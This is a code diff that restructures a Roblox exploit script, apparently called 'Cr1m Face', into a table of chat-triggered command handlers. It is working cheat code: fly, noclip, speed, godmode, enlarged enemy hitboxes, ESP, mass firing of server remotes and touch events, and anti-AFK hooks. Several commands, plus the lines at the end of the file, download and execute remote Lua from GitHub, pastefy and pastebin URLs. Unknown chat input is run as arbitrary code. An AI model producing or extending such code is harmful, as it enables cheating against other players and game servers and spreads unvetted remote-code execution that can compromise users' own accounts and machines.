@@ -8,6 +8,7 @@ local RunService=game:GetService("RunService")
 local TeleportService=game:GetService("TeleportService")
 local HttpService=game:GetService("HttpService")
 local cr1mFlyStates={wasdfly={active=false,bg=nil,bv=nil,conn1=nil,conn2=nil},mfly={active=false,bv=nil,bg=nil,renderConn=nil}}
+local cr1mNoclipConn
 local function cr1mFetch(url)
 local s,r=pcall(function()return game:HttpGet(url)end)
 if s and r then pcall(function()loadstring(r)()end)end
@@ -45,11 +46,12 @@ end
 end
 local TweenService=game:GetService("TweenService")
 local UIS=game:GetService("UserInputService")
-local function runCommand(txt)
-if txt==""then return end
+local function split(txt)
 local args={}for word in txt:gmatch("%S+")do table.insert(args,word)end
-local cmd=args[1]and args[1]:lower()or""
-if cmd=="fly"then
+return args
+end
+local commandHandlers={}
+commandHandlers.fly=function(args)
 if cr1mFlyStates.fly and cr1mFlyStates.fly.active then return end
 local state={active=true,bg=nil,bv=nil,renderConn=nil,conn1=nil,conn2=nil}
 cr1mFlyStates.fly=state
@@ -106,7 +108,8 @@ state.bg.CFrame=cam.CFrame
 local hum=lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
 if hum then hum.PlatformStand=state.active end
 end)
-elseif cmd=="unfly"then
+end
+commandHandlers.unfly=function(args)
 local state=cr1mFlyStates.fly
 if state and state.active then
 state.active=false
@@ -118,7 +121,8 @@ if state.conn2 then state.conn2:Disconnect()state.conn2=nil end
 local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
 if hum then hum.PlatformStand=false end
 end
-elseif cmd=="lay"then
+end
+commandHandlers.lay=function(args)
 local layPlr=Players.LocalPlayer
 local layChar=layPlr.Character or layPlr.CharacterAdded:Wait()
 local layHum=layChar:WaitForChild("Humanoid")
@@ -136,7 +140,8 @@ if laying and not gpe and (input.UserInputType==Enum.UserInputType.Touch or inpu
 task.spawn(function()
 while laying do if not layHum.PlatformStand then layHum.PlatformStand=true end task.wait()end
 layHum.PlatformStand=false end)
-elseif cmd=="speed"then
+end
+commandHandlers.speed=function(args)
 local spdVal=tonumber(args[2])
 if spdVal then
 spdVal=math.clamp(spdVal,1,1000)
@@ -144,20 +149,23 @@ local spdChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local spdHum=spdChar:FindFirstChildOfClass("Humanoid")
 if spdHum then spdHum.WalkSpeed=spdVal end
 end
-elseif cmd=="remotespy"then cr1mFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")
-elseif cmd=="dex"then cr1mFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")
-elseif cmd=="chatadmin"then cr1mFetch("https://pastefy.app/H6k8QmIp/raw")
-elseif cmd=="reset"then
+end
+commandHandlers.remotespy=function(args)cr1mFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")end
+commandHandlers.dex=function(args)cr1mFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")end
+commandHandlers.chatadmin=function(args)cr1mFetch("https://pastefy.app/H6k8QmIp/raw")end
+commandHandlers.reset=function(args)
 local rstChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 rstChar:BreakJoints()
-elseif cmd=="rejoin"then TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
-elseif cmd=="serverhop"then
+end
+commandHandlers.rejoin=function(args)TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)end
+commandHandlers.serverhop=function(args)
 local cr1mSrv=game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?limit=100")
 for _,v in pairs(HttpService:JSONDecode(cr1mSrv).data)do
 if v.playing<v.maxPlayers and v.id~=game.JobId then
 TeleportService:TeleportToPlaceInstance(game.PlaceId,v.id,LocalPlayer)
 break end end
-elseif cmd=="goto"then
+end
+commandHandlers.goto=function(args)
 local tgtName=args[2]
 if tgtName then
 local function findTgt(name)
@@ -173,20 +181,22 @@ local tgt=findTgt(tgtName)
 if tgt and tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart")then
 local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
 if hrp then hrp.CFrame=tgt.Character.HumanoidRootPart.CFrame+Vector3.new(0,3,0)end end end
-
-elseif cmd=="antifling"then
+end
+commandHandlers.antifling=function(args)
 local afChar=LocalPlayer.Character
 if afChar then
 for _,v in pairs(afChar:GetDescendants())do
 if v:IsA("BasePart")and v.Name~="HumanoidRootPart"then v.CustomPhysicalProperties=PhysicalProperties.new(0,0,0)end end
 end
-elseif cmd=="unantifling"then
+end
+commandHandlers.unantifling=function(args)
 local uafChar=LocalPlayer.Character
 if uafChar then
 for _,v in pairs(uafChar:GetDescendants())do
 if v:IsA("BasePart")and v.Name~="HumanoidRootPart"then v.CustomPhysicalProperties=PhysicalProperties.new(1,0.3,0.5)end end
 end
-elseif cmd=="sit"then
+end
+commandHandlers.sit=function(args)
 local sitPlr=Players.LocalPlayer
 local sitChar=sitPlr.Character or sitPlr.CharacterAdded:Wait()
 local sitHum=sitChar:WaitForChild("Humanoid")
@@ -197,22 +207,25 @@ if sitting and new==Enum.HumanoidStateType.Jumping then sitting=false end end)
 task.spawn(function()
 while sitting and sitHum and sitHum.Parent do
 if not sitHum.Sit then sitHum.Sit=true end task.wait(0.1)end end)
-elseif cmd=="leave"then Players.LocalPlayer:Kick("Cr1m Face has kicked you.")
-elseif cmd=="godmode"then
+end
+commandHandlers.leave=function(args)Players.LocalPlayer:Kick("Cr1m Face has kicked you.")end
+commandHandlers.godmode=function(args)
 local gmChar=LocalPlayer.Character
 if gmChar then
 for _,v in pairs(gmChar:GetDescendants())do
 if v:IsA("BasePart")then v.Anchored=false v.CanCollide=true v.Massless=false end end
 gmChar:BreakJoints()
 end
-elseif cmd=="fireremotes"then
+end
+commandHandlers.fireremotes=function(args)
 local remotesList={}
 for _,obj in ipairs(game:GetDescendants())do
 if obj:IsA("RemoteEvent")or obj:IsA("RemoteFunction")then table.insert(remotesList,obj)end end
 for _,remote in ipairs(remotesList)do
 pcall(function()
 if remote:IsA("RemoteEvent")then remote:FireServer()elseif remote:IsA("RemoteFunction")then remote:InvokeServer()end end)end
-elseif cmd=="firetouchinterests"then
+end
+commandHandlers.firetouchinterests=function(args)
 local ftChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local ftHrp=ftChar and ftChar:FindFirstChild("HumanoidRootPart")
 if ftHrp and firetouchinterest then
@@ -220,7 +233,8 @@ for _,part in ipairs(workspace:GetDescendants())do
 if part:IsA("BasePart")and part:FindFirstChildWhichIsA("TouchTransmitter")then
 firetouchinterest(ftHrp,part,0)
 firetouchinterest(ftHrp,part,1)end end end
-elseif cmd=="hitbox"then
+end
+commandHandlers.hitbox=function(args)
 local size=tonumber(args[2])or 10
 for _,player in ipairs(Players:GetPlayers())do
 if player~=LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart")then
@@ -230,36 +244,51 @@ hrp.Transparency=0.7
 hrp.BrickColor=BrickColor.new("Really red")
 hrp.Material=Enum.Material.Neon
 hrp.CanCollide=false end end
-elseif cmd=="noclip"then
-local cr1mNoclip=true
-RunService.Stepped:Connect(function()
-if cr1mNoclip and LocalPlayer.Character then
+end
+commandHandlers.noclip=function(args)
+if cr1mNoclipConn then cr1mNoclipConn:Disconnect()cr1mNoclipConn=nil end
+cr1mNoclipConn=RunService.Stepped:Connect(function()
+if LocalPlayer.Character then
 for _,v in pairs(LocalPlayer.Character:GetDescendants())do
 if v:IsA("BasePart")then v.CanCollide=false end end end end)
-elseif cmd=="clip"then
+end
+commandHandlers.clip=function(args)
+if cr1mNoclipConn then cr1mNoclipConn:Disconnect()cr1mNoclipConn=nil end
 if LocalPlayer.Character then
 for _,v in pairs(LocalPlayer.Character:GetDescendants())do
 if v:IsA("BasePart")then v.CanCollide=true end end end
-elseif cmd=="spin"then
+end
+commandHandlers.spin=function(args)
 local spd=tonumber(args[2])or 10
 local spinChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local spinHrp=spinChar:FindFirstChild("HumanoidRootPart")
 if spinHrp then spawn(function()
 while wait()do spinHrp.CFrame=spinHrp.CFrame*CFrame.Angles(0,math.rad(spd),0)end end)end
-elseif cmd=="view"then
+end
+commandHandlers.view=function(args)
 local viewName=args[2]
 for _,p in ipairs(Players:GetPlayers())do
 if p~=LocalPlayer and p.Name:lower():find(viewName:lower())then
 workspace.CurrentCamera.CameraSubject=p.Character and p.Character:FindFirstChild("Humanoid")end end
-elseif cmd=="fixcam"then workspace.CurrentCamera.CameraSubject=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
-elseif cmd=="fullbright"then Lighting.Brightness=10 Lighting.ClockTime=12 Lighting.FogEnd=1e10 Lighting.GlobalShadows=false Lighting.OutdoorAmbient=Color3.new(1,1,1)
-elseif cmd=="unfullbright"then Lighting.Brightness=2 Lighting.ClockTime=14 Lighting.FogEnd=1000 Lighting.GlobalShadows=true Lighting.OutdoorAmbient=Color3.fromRGB(128,128,128)
-elseif cmd=="esp"then getgenv().Cr1msonESP()
-elseif cmd=="unesp"then getgenv().unCr1msonESP()
-elseif cmd=="antiafk"then for _,v in pairs(getconnections(Players.LocalPlayer.Idled))do v:Disable()end
+end
+commandHandlers.fixcam=function(args)workspace.CurrentCamera.CameraSubject=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")end
+commandHandlers.fullbright=function(args)Lighting.Brightness=10 Lighting.ClockTime=12 Lighting.FogEnd=1e10 Lighting.GlobalShadows=false Lighting.OutdoorAmbient=Color3.new(1,1,1)end
+commandHandlers.unfullbright=function(args)Lighting.Brightness=2 Lighting.ClockTime=14 Lighting.FogEnd=1000 Lighting.GlobalShadows=true Lighting.OutdoorAmbient=Color3.fromRGB(128,128,128)end
+commandHandlers.esp=function(args)getgenv().Cr1msonESP()end
+commandHandlers.unesp=function(args)getgenv().unCr1msonESP()end
+commandHandlers.antiafk=function(args)for _,v in pairs(getconnections(Players.LocalPlayer.Idled))do v:Disable()end end
+local function runCommand(txt)
+if txt==""then return end
+local args=split(txt)
+local cmd=args[1]and args[1]:lower()or""
+local handler=commandHandlers[cmd]
+if handler then
+pcall(function()handler(args)end)
 else
 local s,f=pcall(function()return loadstring(txt)end)
-if s and typeof(f)=="function"then pcall(f)end end end
+if s and typeof(f)=="function"then pcall(f)end
+end
+end
 Players.LocalPlayer.Chatted:Connect(function(msg)if msg:sub(1,1)==";"then runCommand(msg:sub(2))end end)
 pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/Project-Cr1mson/refs/heads/main/loader.lua"))()end)
 pcall(function()loadstring(game:HttpGet("https://pastebin.com/raw/xpyxZ5fd"))()end)
